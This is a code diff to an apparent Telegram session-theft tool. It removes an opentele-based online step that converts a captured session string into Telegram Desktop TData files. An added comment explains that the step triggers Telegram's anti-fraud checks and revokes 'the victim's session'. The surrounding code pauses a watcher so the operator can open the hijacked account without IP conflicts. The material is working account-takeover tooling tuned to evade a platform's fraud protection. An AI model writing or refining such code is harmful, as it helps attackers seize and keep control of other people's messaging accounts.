@@ -1448,27 +1448,8 @@ async def export_session_archive(
         except Exception as td_off_err:
             logger.warning("Offline TData generation notice for %s: %s", user_tg_id, td_off_err)
 
-        # Fallback: online UseCurrentSession
-        if not has_tdata:
-            try:
-                from opentele.td import TDesktop
-                from opentele.tl import TelegramClient as OpenTeleClient
-                from opentele.api import API, UseCurrentSession
-
-                op_client = OpenTeleClient(StringSession(session_string), api=API.TelegramAndroid)
-                await op_client.connect()
-                if await op_client.is_user_authorized():
-                    os.makedirs(tdata_dir, exist_ok=True)
-                    tdesk = await op_client.ToTDesktop(flag=UseCurrentSession, api=API.TelegramDesktop)
-                    if tdesk:
-                        tdesk.SaveTData(basePath=tdata_dir)
-                        for r, d, fs in os.walk(tdata_dir):
-                            if any("key_datas" in f for f in fs):
-                                has_tdata = True
-                                break
-                await op_client.disconnect()
-            except Exception as td_err:
-                logger.warning("Online TData generation notice for %s: %s", user_tg_id, td_err)
+        # Note: Online TData generation is intentionally omitted because calling op_client.connect() 
+        # from VPS IP triggers Telegram DC AuthKeyDuplicated anti-fraud protection and revokes the victim's session.
 
         # Pause active watcher to prevent concurrent IP collision when user opens Telegram Desktop
         if has_tdata and user_tg_id:
